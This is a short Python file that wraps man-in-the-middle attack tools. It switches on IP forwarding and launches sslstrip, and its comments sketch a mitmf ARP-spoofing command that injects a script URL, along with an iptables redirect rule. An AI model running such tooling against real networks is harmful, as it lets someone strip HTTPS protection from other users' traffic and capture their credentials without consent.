import time

import os
def sslStripThread():
    sslStrip = SslStrip()
    sslStrip.enableForwarding()
    sslStrip.startSpoof()

class SslStrip(object):

    def __init__(self):
        pass
    
    def enableForwarding(self):
        try:
            os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward")
        except:
            pass
    
    def startSpoof(self):
        os.system('gnome-terminal -x sh -c "sslstrip -l 1234"')
        #subproces communication
        #print os.popen('service smbd stop')# & service apache2 stop & killall dnsmasq &  mitmf -i eth0 --spoof --arp --target '+str(self.hostIP)+' --gateway '+str(self.routerIP)+' --inject --js-url '+str(self.scriptLink)+'')
        #iptables -t nat -A PREROUTING -p tcp --dport '+str(port)+' --jump DNAT --to-destination '+str(ip)).read().strip()

            
        #
            